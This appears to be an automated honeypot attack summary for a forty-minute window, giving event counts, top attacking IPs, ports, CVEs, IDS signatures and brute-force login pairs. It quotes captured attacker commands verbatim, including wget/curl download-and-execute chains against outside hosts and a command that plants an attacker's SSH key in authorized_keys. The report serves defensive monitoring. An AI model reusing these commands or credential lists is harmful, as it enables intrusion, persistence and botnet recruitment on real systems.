Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-26T12:01:45Z
**Timeframe of Analysis:** 2025-10-26T11:20:01Z to 2025-10-26T12:00:01Z
**Log Files Used:**
- `agg_log_20251026T112001Z.json`
- `agg_log_20251026T114001Z.json`
- `agg_log_20251026T120001Z.json`

### Executive Summary
This report summarizes 22,966 events collected from the honeypot network. The majority of attacks were captured by the Sentrypeer honeypot, targeting VoIP services. The most prominent attacking IP address was `2.57.121.61`, which was responsible for a significant volume of traffic. Attackers primarily targeted port 5060 (SIP). A variety of CVEs were targeted, and attackers attempted to run numerous commands, including downloading and executing shell scripts from external sources.

### Detailed Analysis

**Attacks by Honeypot:**
- Sentrypeer: 14,720
- Honeytrap: 3,405
- Cowrie: 1,594
- Ciscoasa: 1,224
- Dionaea: 517
- Suricata: 1,101
- Tanner: 147
- Adbhoney: 92
- Mailoney: 72
- Heralding: 23
- Redishoneypot: 34
- H0neytr4p: 21
- Miniprint: 9
- ElasticPot: 4
- Honeyaml: 2
- Ipphoney: 1

**Top Attacking IPs:**
- 2.57.121.61: 14,228
- 45.134.26.62: 492
- 41.139.164.134: 452
- 45.140.17.144: 425
- 45.134.26.20: 419
- 185.243.5.121: 338
- 45.140.17.153: 298
- 172.188.91.73: 256
- 107.170.36.5: 174
- 196.191.212.102: 164

**Top Targeted Ports/Protocols:**
- 5060: 14,720
- 445: 476
- 22: 296
- 80: 149
- 8333: 118
- TCP/80: 77
- TCP/17555: 102
- 3388: 65
- 5903: 93
- 5901: 80

**Most Common CVEs:**
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2005-4050
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2001-0414

**Commands Attempted by Attackers:**
- `cd /data/local/tmp/; busybox wget http://202.55.132.254/w.sh; sh w.sh; curl http://202.55.132.254/c.sh; sh c.sh; wget http://202.55.132.254/wget.sh; sh wget.sh; curl http://202.55.132.254/wget.sh; sh wget.sh; busybox wget http://202.55.132.254/wget.sh; sh wget.sh; busybox curl http://202.55.132.254/wget.sh; sh wget.sh`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; curl http://213.209.143.62/c.sh; sh c.sh; wget http://213.209.143.62/wget.sh; sh wget.sh; curl http://213.209.143.62/wget.sh; sh wget.sh; busybox wget http://213.209.143.62/wget.sh; sh wget.sh; busybox curl http://213.209.143.62/wget.sh; sh wget.sh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `pm path com.ufo.miner`
- `echo -e "\x6F\x6B"`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1 / 2402000: 494
- ET SCAN NMAP -sS window 1024 / 2009582: 230
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source) / 2010517: 198
- ET SCAN MS Terminal Server Traffic on Non-standard Port / 2023753: 188
- ET INFO curl User-Agent Outbound / 2013028: 72
- ET HUNTING curl User-Agent to Dotted Quad / 2034567: 72
- ET INFO Reserved Internal IP Traffic / 2002752: 90
- ET HUNTING RDP Authentication Bypass Attempt / 2034857: 62

**Users / Login Attempts:**
- root/gfhfcjkmrf1812
- root/ghjnjc
- /1234
- /123
- root/gfhjk321tgn
- root/ghjnjnbg
- root/gfhjkmrfrgfhjkm
- 345gs5662d34/345gs5662d34
- bash/Drag1823hcacatcuciocolataABC111
- root/Bscs@2024

**Files Uploaded/Downloaded:**
- a>: 92
- wget.sh;: 40
- w.sh;: 10
- c.sh;: 10

**HTTP User-Agents:**
- No user agents were recorded in this period.

**SSH Clients:**
- No SSH clients were recorded in this period.

**SSH Servers:**
- No SSH servers were recorded in this period.

**Top Attacker AS Organizations:**
- No attacker AS organizations were recorded in this period.

### Key Observations and Anomalies
- The overwhelming majority of attacks targeted SIP services on port 5060, with a single IP (`2.57.121.61`) responsible for a large portion of this traffic. This suggests a large-scale, automated campaign against VoIP infrastructure.
- Attackers frequently attempted to download and execute shell scripts (`w.sh`, `c.sh`, `wget.sh`) from external servers. These scripts are likely designed to install malware, cryptocurrency miners, or add the compromised device to a botnet.
- Several commands were aimed at manipulating SSH authorized_keys files, indicating attempts to establish persistent access to compromised systems.
- A variety of usernames and passwords were attempted, ranging from common defaults to more complex and seemingly random strings, indicating the use of brute-force dictionaries.
